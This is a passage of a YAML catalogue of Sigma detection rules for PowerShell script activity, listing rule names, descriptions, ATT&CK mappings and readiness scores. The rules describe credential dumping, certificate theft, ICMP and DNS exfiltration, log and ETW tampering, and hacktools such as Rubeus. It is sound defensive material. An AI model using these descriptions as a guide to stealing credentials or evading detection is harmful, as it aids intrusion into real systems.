  - Legitimate PowerShell scripts
  notes: ''
- detection_id: d93129cd-1ee0-479f-bc03-ca6f129882e3
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_detect_vm_env.yml
  name: Powershell Detect Virtualization Environment
  description: 'Adversaries may employ various system checks to detect and avoid virtualization
    and analysis environments.

    This may include changing behaviors based on the results of checks for the presence
    of artifacts indicative of a virtual machine environment (VME) or sandbox

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1497.001
  tags:
  - attack.discovery
  - attack.defense-evasion
  - attack.t1497.001
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1497.001/T1497.001.md
  - https://techgenix.com/malicious-powershell-scripts-evade-detection/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 1f6399cf-2c80-4924-ace1-6fcff3393480
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_directorysearcher.yml
  name: DirectorySearcher Powershell Exploitation
  description: Enumerates Active Directory to determine computers that are joined
    to the domain
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_ready
  predictive_readiness_score: 8
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  - multi_signal_correlation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1018
  tags:
  - attack.discovery
  - attack.t1018
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1018/T1018.md#atomic-test-15---enumerate-domain-computers-within-active-directory-using-directorysearcher
  false_positives:
  - Unknown
  notes: ''
- detection_id: b29a93fb-087c-4b5b-a84d-ee3309e69d08
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_directoryservices_accountmanagement.yml
  name: Manipulation of User Computer or Group Security Principals Across AD
  description: 'Adversaries may create a domain account to maintain access to victim
    systems.

    Domain accounts are those managed by Active Directory Domain Services where access
    and permissions are configured across systems and services that are part of that
    domain..

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1136.002
  tags:
  - attack.persistence
  - attack.t1136.002
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1136.002/T1136.002.md#atomic-test-3---create-a-new-domain-account-using-powershell
  - https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.accountmanagement?view=net-8.0
  false_positives:
  - Legitimate administrative script
  notes: ''
- detection_id: 602f5669-6927-4688-84db-0d4b7afb2150
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_disable_psreadline_command_history.yml
  name: Disable Powershell Command History
  description: Detects scripts or commands that disabled the Powershell command history
    by removing psreadline module
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics: []
  techniques:
  - T1070.003
  tags:
  - attack.defense-evasion
  - attack.t1070.003
  time_window: ''
  references:
  - https://twitter.com/DissectMalware/status/1062879286749773824
  false_positives:
  - Legitimate script that disables the command history
  notes: ''
- detection_id: 99c4658d-2c5e-4d87-828d-7c066ca537c3
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_disable_windows_optional_feature.yml
  name: Disable-WindowsOptionalFeature Command PowerShell
  description: 'Detect built in PowerShell cmdlet Disable-WindowsOptionalFeature,
    Deployment Image Servicing and Management tool.

    Similar to DISM.exe, this cmdlet is used to enumerate, install, uninstall, configure,
    and update features and packages in Windows images

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics: []
  techniques:
  - T1562.001
  tags:
  - attack.defense-evasion
  - attack.t1562.001
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/5b67c9b141fa3918017f8fa44f2f88f0b1ecb9e1/atomics/T1562.001/T1562.001.md
  - https://learn.microsoft.com/en-us/powershell/module/dism/disable-windowsoptionalfeature?view=windowsserver2022-ps
  false_positives:
  - Unknown
  notes: ''
- detection_id: ddcd88cb-7f62-4ce5-86f9-1704190feb0a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_dotnet_assembly_from_file.yml
  name: Potential In-Memory Execution Using Reflection.Assembly
  description: Detects usage of "Reflection.Assembly" load functions to dynamically
    load assemblies in memory
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics: []
  techniques:
  - T1620
  tags:
  - attack.defense-evasion
  - attack.t1620
  time_window: ''
  references:
  - https://speakerdeck.com/heirhabarov/hunting-for-powershell-abuse?slide=50
  false_positives:
  - Legitimate use of the library
  notes: ''
- detection_id: 3c7d1587-3b13-439f-9941-7d14313dbdfe
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_download_com_cradles.yml
  name: Potential COM Objects Download Cradles Usage - PS Script
  description: Detects usage of COM objects that can be abused to download files in
    PowerShell by CLSID
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics: []
  techniques:
  - T1105
  tags:
  - attack.command-and-control
  - attack.t1105
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/dotnet/api/system.type.gettypefromclsid?view=net-7.0
  - https://speakerdeck.com/heirhabarov/hunting-for-powershell-abuse?slide=57
  false_positives:
  - Legitimate use of the library
  notes: ''
- detection_id: 846c7a87-8e14-4569-9d49-ecfd4276a01c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_dsinternals_cmdlets.yml
  name: DSInternals Suspicious PowerShell Cmdlets - ScriptBlock
  description: 'Detects execution and usage of the DSInternals PowerShell module.
    Which can be used to perform what might be considered as suspicious activity such
    as dumping DPAPI backup keys or manipulating NTDS.DIT files.

    The DSInternals PowerShell Module exposes several internal features of Active
    Directory and Azure Active Directory. These include FIDO2 and NGC key auditing,
    offline ntds.dit file manipulation, password auditing, DC recovery from IFM backups
    and password hash calculation.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_ready
  predictive_readiness_score: 9
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: high
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  tags:
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://github.com/MichaelGrafnetter/DSInternals/blob/39ee8a69bbdc1cfd12c9afdd7513b4788c4895d4/Src/DSInternals.PowerShell/DSInternals.psd1
  false_positives:
  - Legitimate usage of DSInternals for administration or audit purpose.
  notes: ''
- detection_id: 99c49d9c-34ea-45f7-84a7-4751ae6b2cbc
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_dump_password_windows_credential_manager.yml
  name: Dump Credentials from Windows Credential Manager With PowerShell
  description: 'Adversaries may search for common password storage locations to obtain
    user credentials.

    Passwords are stored in several places on a system, depending on the operating
    system or application holding the credentials.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics: []
  techniques:
  - T1555
  tags:
  - attack.credential-access
  - attack.t1555
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1555/T1555.md
  false_positives:
  - Unknown
  notes: ''
- detection_id: 991a9744-f2f0-44f2-bd33-9092eba17dc3
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_enable_psremoting.yml
  name: Enable Windows Remote Management
  description: Adversaries may use Valid Accounts to interact with remote systems
    using Windows Remote Management (WinRM). The adversary may then perform actions
    as the logged-on user.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics: []
  techniques:
  - T1021.006
  tags:
  - attack.lateral-movement
  - attack.t1021.006
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1021.006/T1021.006.md#atomic-test-1---enable-windows-remote-management
  - https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/enable-psremoting?view=powershell-7.2
  false_positives:
  - Legitimate script
  notes: ''
- detection_id: 55c925c1-7195-426b-a136-a9396800e29b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_enable_susp_windows_optional_feature.yml
  name: Potential Suspicious Windows Feature Enabled
  description: 'Detects usage of the built-in PowerShell cmdlet "Enable-WindowsOptionalFeature"
    used as a Deployment Image Servicing and Management tool.

    Similar to DISM.exe, this cmdlet is used to enumerate, install, uninstall, configure,
    and update features and packages in Windows images

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/powershell/module/dism/enable-windowsoptionalfeature?view=windowsserver2022-ps
  - https://learn.microsoft.com/en-us/windows/win32/projfs/enabling-windows-projected-file-system
  - https://learn.microsoft.com/en-us/windows/wsl/install-on-server
  false_positives:
  - Legitimate usage of the features listed in the rule.
  notes: ''
- detection_id: 603c6630-5225-49c1-8047-26c964553e0e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_enumerate_password_windows_credential_manager.yml
  name: Enumerate Credentials from Windows Credential Manager With PowerShell
  description: 'Adversaries may search for common password storage locations to obtain
    user credentials.

    Passwords are stored in several places on a system, depending on the operating
    system or application holding the credentials.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics: []
  techniques:
  - T1555
  tags:
  - attack.credential-access
  - attack.t1555
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1555/T1555.md
  false_positives:
  - Unknown
  notes: ''
- detection_id: 115fdba9-f017-42e6-84cf-d5573bf2ddf8
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_etw_trace_evasion.yml
  name: Disable of ETW Trace - Powershell
  description: Detects usage of powershell cmdlets to disable or remove ETW trace
    sessions
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics: []
  techniques:
  - T1070
  - T1562.006
  tags:
  - attack.defense-evasion
  - attack.t1070
  - attack.t1562.006
  - car.2016-04-002
  time_window: ''
  references:
  - https://medium.com/palantir/tampering-with-windows-event-tracing-background-offense-and-defense-4be7ac62ac63
  false_positives:
  - Unknown
  notes: ''
- detection_id: 15b7abbb-8b40-4d01-9ee2-b51994b1d474
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_exchange_mailbox_smpt_forwarding_rule.yml
  name: Suspicious PowerShell Mailbox SMTP Forward Rule
  description: Detects usage of the powerShell Set-Mailbox Cmdlet to set-up an SMTP
    forwarding rule.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Exfiltration
  techniques: []
  tags:
  - attack.exfiltration
  time_window: ''
  references:
  - https://m365internals.com/2022/10/07/hunting-in-on-premises-exchange-server-logs/
  false_positives:
  - Legitimate usage of the cmdlet to forward emails
  notes: ''
- detection_id: aa7a3fce-bef5-4311-9cc1-5f04bb8c308c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_export_certificate.yml
  name: Certificate Exported Via PowerShell - ScriptBlock
  description: Detects calls to cmdlets inside of PowerShell scripts that are used
    to export certificates from the local certificate store. Threat actors were seen
    abusing this to steal private keys from compromised machines.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics: []
  techniques:
  - T1552.004
  tags:
  - attack.credential-access
  - attack.t1552.004
  time_window: ''
  references:
  - https://us-cert.cisa.gov/ncas/analysis-reports/ar21-112a
  - https://learn.microsoft.com/en-us/powershell/module/pki/export-pfxcertificate?view=windowsserver2022-ps
  - https://www.splunk.com/en_us/blog/security/breaking-the-chain-defending-against-certificate-services-abuse.html
  false_positives:
  - Legitimate certificate exports by administrators. Additional filters might be
    required.
  notes: ''
- detection_id: df69cb1d-b891-4cd9-90c7-d617d90100ce
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_frombase64string_archive.yml
  name: Suspicious FromBase64String Usage On Gzip Archive - Ps Script
  description: Detects attempts of decoding a base64 Gzip archive in a PowerShell
    script. This technique is often used as a method to load malicious content into
    memory afterward.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics: []
  techniques:
  - T1132.001
  tags:
  - attack.command-and-control
  - attack.t1132.001
  time_window: ''
  references:
  - https://speakerdeck.com/heirhabarov/hunting-for-powershell-abuse?slide=43
  false_positives:
  - Legitimate administrative script
  notes: ''
- detection_id: 95afc12e-3cbb-40c3-9340-84a032e596a3
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_get_acl_service.yml
  name: Service Registry Permissions Weakness Check
  description: 'Adversaries may execute their own malicious payloads by hijacking
    the Registry entries used by services.

    Adversaries may use flaws in the permissions for registry to redirect from the
    originally specified executable to one that they control, in order to launch their
    own code at Service start.

    Windows stores local service configuration information in the Registry under HKLM\SYSTEM\CurrentControlSet\Services

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1574.011
  tags:
  - attack.privilege-escalation
  - attack.defense-evasion
  - attack.persistence
  - attack.t1574.011
  - stp.2a
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1574.011/T1574.011.md#atomic-test-1---service-registry-permissions-weakness
  - https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/get-acl?view=powershell-7.4
  false_positives:
  - Legitimate administrative script
  notes: ''
- detection_id: 36bed6b2-e9a0-4fff-beeb-413a92b86138
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_get_adcomputer.yml
  name: Active Directory Computers Enumeration With Get-AdComputer
  description: Detects usage of the "Get-AdComputer" to enumerate Computers or properties
    within Active Directory.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1018
  - T1087.002
  tags:
  - attack.discovery
  - attack.t1018
  - attack.t1087.002
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/powershell/module/activedirectory/get-adcomputer
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1018/T1018.md
  - https://github.com/redcanaryco/atomic-red-team/blob/02cb591f75064ffe1e0df9ac3ed5972a2e491c97/atomics/T1087.002/T1087.002.md
  false_positives:
  - Unknown
  notes: ''
- detection_id: 8c3a6607-b7dc-4f0d-a646-ef38c00b76ee
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_get_adgroup.yml
  name: Active Directory Group Enumeration With Get-AdGroup
  description: Detects usage of the "Get-AdGroup" cmdlet to enumerate Groups within
    Active Directory
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1069.002
  tags:
  - attack.discovery
  - attack.t1069.002
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1018/T1018.md
  false_positives:
  - Unknown
  notes: ''
- detection_id: 060c3ef1-fd0a-4091-bf46-e7d625f60b73
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_get_adreplaccount.yml
  name: Suspicious Get-ADReplAccount
  description: 'The DSInternals PowerShell Module exposes several internal features
    of Active Directory and Azure Active Directory.

    These include FIDO2 and NGC key auditing, offline ntds.dit file manipulation,
    password auditing, DC recovery from IFM backups and password hash calculation.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics: []
  techniques:
  - T1003.006
  tags:
  - attack.credential-access
  - attack.t1003.006
  time_window: ''
  references:
  - https://www.powershellgallery.com/packages/DSInternals
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1003.006/T1003.006.md#atomic-test-2---run-dsinternals-get-adreplaccount
  false_positives:
  - Legitimate PowerShell scripts
  notes: ''
- detection_id: e0565f5d-d420-4e02-8a68-ac00d864f9cf
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_get_childitem_bookmarks.yml
  name: Automated Collection Bookmarks Using Get-ChildItem PowerShell
  description: 'Adversaries may enumerate browser bookmarks to learn more about compromised
    hosts.

    Browser bookmarks may reveal personal information about users (ex: banking sites,
    interests, social media, etc.) as well as details about

    internal network resources such as servers, tools/dashboards, or other related
    infrastructure.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1217
  tags:
  - attack.discovery
  - attack.t1217
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1217/T1217.md
  false_positives:
  - Unknown
  notes: ''
- detection_id: 904e8e61-8edf-4350-b59c-b905fc8e810c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_get_process_security_software_discovery.yml
  name: Security Software Discovery Via Powershell Script
  description: 'Detects calls to "get-process" where the output is piped to a "where-object"
    filter to search for security solution processes.

    Adversaries may attempt to get a listing of security software, configurations,
    defensive tools, and sensors that are installed on a system or in a cloud environment.
    This may include things such as firewall rules and anti-virus

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1518.001
  tags:
  - attack.discovery
  - attack.t1518.001
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1518.001/T1518.001.md#atomic-test-2---security-software-discovery---powershell
  false_positives:
  - False positives might occur due to the nature of the ScriptBlock being ingested
    as a big blob. Initial tuning is required.
  - As the "selection_cmdlet" is common in scripts the matching engine might slow
    down the search. Change into regex or a more accurate string to avoid heavy resource
    consumption if experienced
  notes: ''
- detection_id: 3245cd30-e015-40ff-a31d-5cadd5f377ec
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_hktl_rubeus.yml
  name: HackTool - Rubeus Execution - ScriptBlock
  description: Detects the execution of the hacktool Rubeus using specific command
    line flags
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: high
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics: []
  techniques:
  - T1003
  - T1550.003
  - T1558.003
  tags:
  - attack.defense-evasion
  - attack.credential-access
  - attack.t1003
  - attack.t1558.003
  - attack.lateral-movement
  - attack.t1550.003
  time_window: ''
  references:
  - https://blog.harmj0y.net/redteaming/from-kekeo-to-rubeus
  - https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html
  - https://github.com/GhostPack/Rubeus
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 851fd622-b675-4d26-b803-14bc7baa517a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_hktl_winpwn.yml
  name: HackTool - WinPwn Execution - ScriptBlock
  description: 'Detects scriptblock text keywords indicative of potential usge of
    the tool WinPwn. A tool for Windows and Active Directory reconnaissance and exploitation.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Discovery
  - Execution
  techniques:
  - T1046
  - T1082
  - T1106
  - T1518
  - T1548.002
  - T1552.001
  - T1555
  - T1555.003
  tags:
  - attack.credential-access
  - attack.defense-evasion
  - attack.discovery
  - attack.execution
  - attack.privilege-escalation
  - attack.t1046
  - attack.t1082
  - attack.t1106
  - attack.t1518
  - attack.t1548.002
  - attack.t1552.001
  - attack.t1555
  - attack.t1555.003
  time_window: ''
  references:
  - https://github.com/S3cur3Th1sSh1t/WinPwn
  - https://www.publicnow.com/view/EB87DB49C654D9B63995FAD4C9DE3D3CC4F6C3ED?1671634841
  - https://reconshell.com/winpwn-tool-for-internal-windows-pentesting-and-ad-security/
  - https://github.com/redcanaryco/atomic-red-team/blob/4d6c4e8e23d465af7a2388620cfe3f8c76e16cf0/atomics/T1082/T1082.md
  - https://grep.app/search?q=winpwn&filter[repo][0]=redcanaryco/atomic-red-team
  false_positives:
  - As the script block is a blob of text. False positive may occur with scripts that
    contain the keyword as a reference or simply use it for detection.
  notes: ''
- detection_id: f5d1def8-1de0-4a0e-9794-1f6f27dd605c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_hotfix_enum.yml
  name: PowerShell Hotfix Enumeration
  description: Detects call to "Win32_QuickFixEngineering" in order to enumerate installed
    hotfixes often used in "enum" scripts by attackers
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Discovery
  techniques: []
  tags:
  - attack.discovery
  time_window: ''
  references:
  - https://github.com/411Hall/JAWS/blob/233f142fcb1488172aa74228a666f6b3c5c48f1d/jaws-enum.ps1
  false_positives:
  - Legitimate administration scripts
  notes: ''
- detection_id: 4c4af3cd-2115-479c-8193-6b8bfce9001c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_icmp_exfiltration.yml
  name: PowerShell ICMP Exfiltration
  description: Detects Exfiltration Over Alternative Protocol - ICMP. Adversaries
    may steal data by exfiltrating it over an un-encrypted network protocol other
    than that of the existing command and control channel.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Exfiltration
  techniques:
  - T1048.003
  tags:
  - attack.exfiltration
  - attack.t1048.003
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1048.003/T1048.003.md#atomic-test-2---exfiltration-over-alternative-protocol---icmp
  false_positives:
  - Legitimate usage of System.Net.NetworkInformation.Ping class
  notes: ''
- detection_id: 21f9162c-5f5d-4b01-89a8-b705bd7d10ab
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_import_module_susp_dirs.yml
  name: Import PowerShell Modules From Suspicious Directories
  description: Detects powershell scripts that import modules from suspicious directories
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  tags:
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1003.002/T1003.002.md
  false_positives:
  - Unknown
  notes: ''
- detection_id: 975b2262-9a49-439d-92a6-0709cccdf0b2
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_install_unsigned_appx_packages.yml
  name: Unsigned AppX Installation Attempt Using Add-AppxPackage - PsScript
  description: Detects usage of the "Add-AppxPackage" or it's alias "Add-AppPackage"
    to install unsigned AppX packages
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Persistence
  techniques: []
  tags:
  - attack.persistence
  - attack.defense-evasion
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/windows/msix/package/unsigned-package
  - https://twitter.com/WindowsDocs/status/1620078135080325122
  false_positives:
  - Installation of unsigned packages for testing purposes
  notes: ''
- detection_id: 7b836d7f-179c-4ba4-90a7-a7e60afb48e6
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_invoke_command_remote.yml
  name: Execute Invoke-command on Remote Host
  description: Adversaries may use Valid Accounts to interact with remote systems
    using Windows Remote Management (WinRM). The adversary may then perform actions
    as the logged-on user.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics: []
  techniques:
  - T1021.006
  tags:
  - attack.lateral-movement
  - attack.t1021.006
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1021.006/T1021.006.md#atomic-test-2---invoke-command
  - https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/invoke-command?view=powershell-7.4
  false_positives:
  - Legitimate script
  notes: ''
- detection_id: d59d7842-9a21-4bc6-ba98-64bfe0091355
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_invoke_dnsexfiltration.yml
  name: Powershell DNSExfiltration
